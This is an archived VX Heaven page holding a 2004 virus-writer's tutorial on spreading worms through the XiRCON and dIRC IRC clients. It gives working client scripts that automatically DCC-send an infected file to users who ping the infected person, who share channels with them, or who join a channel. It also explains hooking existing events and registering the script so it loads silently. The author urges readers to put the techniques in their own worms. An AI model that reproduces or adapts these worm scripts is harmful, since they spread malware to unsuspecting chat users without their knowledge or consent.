<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'New IRC spreading' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,New IRC spreading, dirc, programs, program, words, information, article, channel, scripts, script, virus, standart, dragonmount, networks, file, spreading"/>
<meta name="Description" content="IRC (Internet Relay Chat) has been being a virus spreading field for years. Nowadays there are three different programs, which allow virus spreading via IRC. These are mIRC, pIRCh and vIRC. SnakeByte wrote an article about how to spread viruses with these three programs some years ago (www.snake-basket.de). But when I sat down and thought, why aren't there more programs, I got no senseful answere, so I downloaded some programs, and tried to make a new virus-script for them. And, as you may imagine, I had more than less some successes. I wrote some scripts for some IRC clients, and added some information. The result of my working is this article. :) Well, stop reading this intro now, and learn, how to spread your virus/worm via other IRC clients."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"e0393899cccdd91713937dd699b8c9edb6302d58-1498757962-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp04.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>New IRC spreading</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em>http://spth.de.vu/</em><br/> <em>January 2004</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp04.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp04">Back to index</a>] [<a href="/lib/vsp04.html#disqus_thread">Comments</a>]<br/> 
<h2>Index</h2>
<ol start="0">
<li><a href="#p0">Intro Words</a></li>
<li><a href="#p1">XiRCON</a>
<ol type="a">
<li><a href="#p1a">Information about XiRCON</a></li>
<li><a href="#p1b">Spreading: The hard way</a></li>
<li><a href="#p1c">Spreading: The (more) silence way</a></li>
</ol></li>
<li><a href="#p2">dIRC</a>
<ol type="a">
<li><a href="#p2a">Information about dIRC</a></li>
<li><a href="#p2b">Spreading: One by one</a></li>
</ol></li>
<li><a href="#p3">Last words</a></li>
</ol>
<h2><a name="p0"></a>0) Intro words</h2>
<p>IRC (Internet Relay Chat) has been being a virus spreading field for years. Nowadays there are three different programs, which allow virus spreading via IRC. These are mIRC, pIRCh and vIRC. SnakeByte wrote an article about how to spread viruses with these three programs some years ago (www.snake-basket.de). But when I sat down and thought, why aren't there more programs, I got no senseful answere, so I downloaded some programs, and tried to make a new virus-script for them. And, as you may imagine, I had more than less some successes. I wrote some scripts for some IRC clients, and added some information. The result of my working is this article. :) Well, stop reading this intro now, and learn, how to spread your virus/worm via other IRC clients.</p>
<h2><a name="p1"></a>1) XiRCON</h2>
<h3><a name="p1a"></a>a) Information about XiRCON</h3>
<p>This is not a very common program, anyway, it's possible to write worms for it, and therefore I decided to make such a worm. :) Well, you will find the program here: www.xirchon.com. XiRCON uses a complex syntax for it's scripts and you're able to do really much with it. The auto-script is called 'Default.tcl', and is directly in the XiRCON-directory (-programfiles-/XiRCON/ is the standart). The standart scripts in there are nothing important, but nice to learn from :). OK, the program is able to uses 24 different events, but unfortunatly there are no directly 'join-user' event, so we have to do it in another way. But you will see....</p>
<h3><a name="p1b"></a>b) Spreading: The hard way</h3>
<p>You may wonder, what the topic is about, but you will see :). The infected user should not recognize, that he/she is infected. OK, as I've already told you before, there is no 'good' virus-event, so I thougth, it would be of some sense, to use the event 'CTCP', which is PING. Note: If the event already exists, you can't just add the same again, because there would be an error. Therefore search in the whole script for a string called 'on ctcp {'. If it exists, hook it, otherwise, add the new one. Well, the worm script will be active, if any user pings you.</p>
<p>Now: what does it? It sends the infected file (here it is 'test.txt') to every nick in every channel, where the infected user is. Now you know, why this is called 'hard way'. Since every user gets a virus (also the OPs), the infected user will be kicked in some channels (believe me, I tested it :D). Anyway, there will be many new infected people, and so the worm did what we was expect to do. Now look at the source, and you'll understand it.</p>
<h4>XiRCON: The hard way</h4>
<pre class="source">
on ctcp {
  foreach n [channels] {
    if {$n != [my_nick]} {
      /dcc send $n test.txt
    }
  }
}
</pre>
<h3><a name="p1c"></a>c) Spreading: The (more) silence way</h3>
<p>At the first example the infected person will recognize that something smells fishy. So I did it in another way, better, but not so fast. But in my opinion you should use this one because the user don't know so fast, that he's infected. Well, this time I used two events: 'CTCP' again and (the new one) 'timer', which runs once time per second. It's behavior is the following: A variable (called 'sent') is set to 1. Now somebody pings you, and the variable will set to 0 and the nick of the PINGer is saved as 'sentto'. Now the fun begins in the timer-event. The event checks, if sent!=1, and then it waits 1-30sec. After that it sends the infected file to 'sentto'. Finishing the event, 'sent' is 1 again, and the whole is waiting for the next ping :). Again: The two events must not be twice in a file. So look for the events and hook them (overwrite the code or just add it). Now, look at the source, and you will understand, how to do this.</p>
<h4>XiRCON: The (more) silence way</h4>
<pre class="source">
set sent 1

on ctcp {
  set sent 0
  set sentto [nick]
}

on timer {
    set currTime [clock seconds]
    if {([expr ($currTime - 15) % 30] == 0) &amp;&amp; ($currTime != 15) &amp;&amp; ($sent != 1)} { 
       /dcc send $sentto test.txt
       set sent 1
    }
}
</pre>
<h2><a name="p2"></a>2) dIRC</h2>
<h3><a name="p2a"></a>a) Information about dIRC</h3>
<p>This is a funny, very colorful IRC client, which you can find here: http://www.dircchat.com. The standart-directory is this one: -program-files-\Dragonmount Networks\dIRC. dIRC uses just 12 different events and only 7 (!!!) variables. You may think that sucks but a worm code don't need really much. Fortunatly this program has a 'join'-event, so it's quite easier to write a IRC-worm for dIRC as for the XiRCON. Well, the program auto-loads a script called 'standard.dsf' in the directory 'scripts'. The whole standart content (760 byte - wooow) is completly bullshit :). The program has a script-editor, where it's easy to generate new aliases or events. Hmm, well, I think that I said everything important...</p>
<h3><a name="p2b"></a>b) Spreading: One by One</h3>
<p>As I've already told you, dIRC has a 'join' event, which is executed every time when a user joins a channel, and it returns the nickname of the person and the channel, where (s)he joined. OK, cool, let's think: We have the nick of a person who joined a channel?? What to do? INFECT!!! :) Look at the example. It's really easy to understand, and it's very(!!!) shourt (two lines). If you want to use the technique, add the code to the 'standart.dsf' or make a new .dsf file in the script directory as I did it. Don't forget the first (empty) line and the last line ('==='), since it's dIRC syntax [cooool! :D]</p>
<p>NOTE: 'dIRC dcc send' automatically ignores '.exe' and '.vbs' files!</p>
<h4>dIRC: One by One</h4>
<pre class="source">
#commands
#VBScript
!!! Do not edit the contents of this file. !!!

#EVENT# vir Join	*	*	on
sendcommand "/dcc send " &amp; Nick &amp; " test.txt"
===
</pre>
<p>OK, now we have our script, which infects every user who joins to a channel. But we have also load the script, otherwise it won't work. How to do this? In the dIRC-folder we'll find a file called 'scripts.drc'. This file saves every script that becomes loaded. Here we have to add a line with our script-file. Let's look at the hooked filecontent:</p>
<h4>dIRC: One by One</h4>
<pre class="source">
C:\Programme\Dragonmount Networks\dIRC\scripts\standard.dsf	commands	VBScript
C:\Programme\Dragonmount Networks\dIRC\scripts\virus.dsf	commands	VBScript
</pre>
<p>That should explain everthing. If you do all these things, your dIRC-worm will work...</p>
<h2><a name="p3"></a>3) Last words</h2>
<p>Internet Relay Chat is a very successful way, how you can spread your viruses. And, as far as I know, there are just 3 programs around, where we are able to make a worm for it. Well, as I thought 3 programs are too few. So I sat down, downloaded some programs, and made a worm for them. I hope you like this article and you will use some of the techniques I told you in one of your next worms. :) It would be cool if you could send me a mail, and tell me, what you think about this article. I think I said everything important and you read everything important, so: Go on writing a cool virus or worm. :D</p>
<p>A very big thanks goes to SlageHammer for helping me to test the codes.</p>
<pre>
                                                        - - - - - - - - - - - - - - -
                                                          Second Part To Hell/[rRlf]  
                                                          www.spth.de.vu
                                                          <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="92e1e2e6fad2f3fdfcfff3fbfebcf3e6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
                                                          written from dec 2003-january 2004
                                                          Austria
                                                        - - - - - - - - - - - - - - -</pre>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp04">Back to index</a>] [<a href="/lib/vsp04.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp04">de</a><a href="/lib/index.php?lang=en&amp;id=vsp04">en</a><a href="/lib/index.php?lang=es&amp;id=vsp04">es</a><a href="/lib/index.php?lang=it&amp;id=vsp04">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp04">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp04">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp04">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp04">ua</a></div>
</body>
</html>
